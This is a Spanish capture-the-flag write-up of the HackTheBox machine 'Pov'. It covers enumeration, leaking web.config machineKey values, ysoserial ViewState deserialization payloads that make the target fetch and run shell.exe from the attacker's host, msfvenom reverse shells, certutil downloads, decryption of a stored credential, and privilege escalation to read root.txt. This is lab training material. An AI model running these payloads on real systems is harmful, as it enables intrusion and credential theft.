---
description: https://app.hackthebox.com/machines/Pov
---

# 游릳 HTB - Pov

Informaci칩n General

* **Nombre de la M치quina: Pov**
* **IP de la M치quina:**  10.129.187.106
* **Sistema Operativo: Windows**
* **Dificultad: Medium**
* **Fecha de Publicaci칩n:** 27 Jan 2024



***

### Enumeraci칩n

#### Ping para obtener ruta de retorno

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n `-R` para incluir la ruta de retorno:

```bash
ping -c 1 10.129.187.106 -R
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

El valor de TTL (Time To Live) igual a 127 puede ser indicativo de que el sistema operativo de la m치quina objetivo es Windows. El TTL es un valor en el campo de los paquetes IP que indica la duraci칩n que un paquete puede estar en una red antes de ser descartado. <mark style="color:yellow;">**Windows establece por defecto el valor de TTL de sus paquetes IP en 128**</mark>, que al pasar por un salto en la red se decrementa a 127.

#### **Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones `-p-` para escanear todos los puertos, `--open` para mostrar solo los puertos abiertos, `-sS` para un escaneo de tipo TCP SYN, `--min-rate 5000` para establecer la velocidad m칤nima de paquetes y `-vvv` para un nivel de verbosidad alto. Adem치s, utilizamos `-n` para desactivar la resoluci칩n de DNS, `-Pn` para no realizar el escaneo de ping, y `-oG allPorts` para guardar la salida en un archivo con formato Greppable <mark style="color:yellow;">para luego utilizar nuestra funci칩n extractPorts</mark>:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.187.106 -oG allPorts
</strong>extractPorts allPorts
</code></pre>



#### **Escaneo detallado con Nmap**

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n `-sCV` para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con `-p __PORTS__` (reemplazando `__PORTS__` con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre `targeted`:

```bash
sudo nmap -sCV -O -p80 10.129.187.106 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Modificando /etc/hosts

Para a침adir la entrada "10.129.187.106 pov.htb" al archivo `/etc/hosts`, puedes usar el siguiente comando en la terminal:

```bash
echo "10.129.187.106 pov.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP `10.129.187.106`  asociada al nombre de host  `pov.htb` al archivo `/etc/hosts` de tu sistema.

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
dirsearch -u http://pov.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
gobuster dir -u http://pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  -o directory-list-2.3-medium.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
gobuster dns -d pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
echo "10.129.187.106 dev.pov.htb" | sudo tee -a /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Al hacer click en descargar el CV corre el siguiente javascript:\
`javascript:__doPostBack('download','')`, Por lo que decido utilizar Burpsuite para ver que ocurre m치s a fondo:

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Envio al Repeater y pruebo descargar el contact.aspx.cs.

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Quiero creer que funciona por lo que le pregunto a ChatGPT qu칠 archivos sensibles podr칤a descargar:

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que descargo web.config:

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Despu칠s de un rato buscando informaci칩n, me entero de que es vulnerable a un ataque llamado: `NET ViewState deserialization` decidi hacer un post explicandolo con lo que he estudiado sobre el. [exploiting-\_\_viewstate.md](../../pentest/exploitation/exploiting-\_\_viewstate.md "mention").

#### Ejemplo pr치ctico con m치quina Pov de HTB

{% code overflow="wrap" %}
```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```
{% endcode %}

Ingresamos los valores del `decryptionKey` y el `validationKey` en ysoserial.exe para generar nuestro payload.

{% code overflow="wrap" %}
```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.14.54:8888/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Luego vamos a nuestra pagina vulnerable e inyectamos el c칩digo en el parametro `__VIEWSTATE=`

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Por lo que creamos dos payloads, uno para descargar nuestra shell.exe alojada en nuestra maquina atacante, y otro para ejecutar el archivo.

{% code overflow="wrap" %}
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c curl http://10.10.14.54:8888/shell.exe -o C:\ProgramData\shell.exe" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"

ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c C:\ProgramData\shell.exe" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

</div>

Registrando los directorios del usuario sfitz, me encuentro con un archivo `connection.xml`

<div align="left">

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

</div>

Dentro de el podemos encontrar la clave de otro usuario del sistema encriptada.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Para saber cual es la clave ejecutamos los siguientes comandos en la consola modo PowerShell:

{% code overflow="wrap" %}
```powershell
$EncryptedString = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6"
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Ahora lo que queremos hacer es iniciar otra sesi칩n pero ahora con el usuario  alaading. Para ello utilizaremos la herramienta [runascs.md](../../hacking/windows-server-hacking/windows-privilege-escalation/runascs.md "mention")

Despu칠s de compartila desde nuestro servidor procedemos a descargarla:

```batch
certutil -urlcache -f http://10.10.14.54:8888/RunasCs.exe RunasCs.exe
```

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.54 LPORT= -f exe -o expl2.exe
certutil -urlcache -f http://10.10.14.54:8888/4321.exe 4321.exe
RunasCs.exe alaading f8gQ8fynP44ek1m3 4321.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption><p>user.txt flag</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

```bash
certutil -urlcache -f http://10.10.14.54:8888/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1
certutil -urlcache -f http://10.10.14.54:8888/psgetsys.ps1 psgetsys.ps1
.\psgetsys.ps1
.\EnableAllTokenPrivs.ps1
```

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

Ahora voy a crear otra shell y la ejecutar칠 desde el usuario con los scripts ejecutados.

{% code overflow="wrap" %}
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.54 LPORT=7676 -f exe -o 7676.exe
certutil -urlcache -f http://10.10.14.54:8888/7676.exe 7676.exe
.\7676.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Ahora lo que quiero hacer es migrar el proceso hacia el de `winlogon.exe`, para ello primero debo ver los procesos junto a sus `PID` y luego `migrate PID_VALUE`

```
ps
migrate 552
shell
whoami /priv
type C:\Users\Administrator\Desktop\root.txt

```

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>
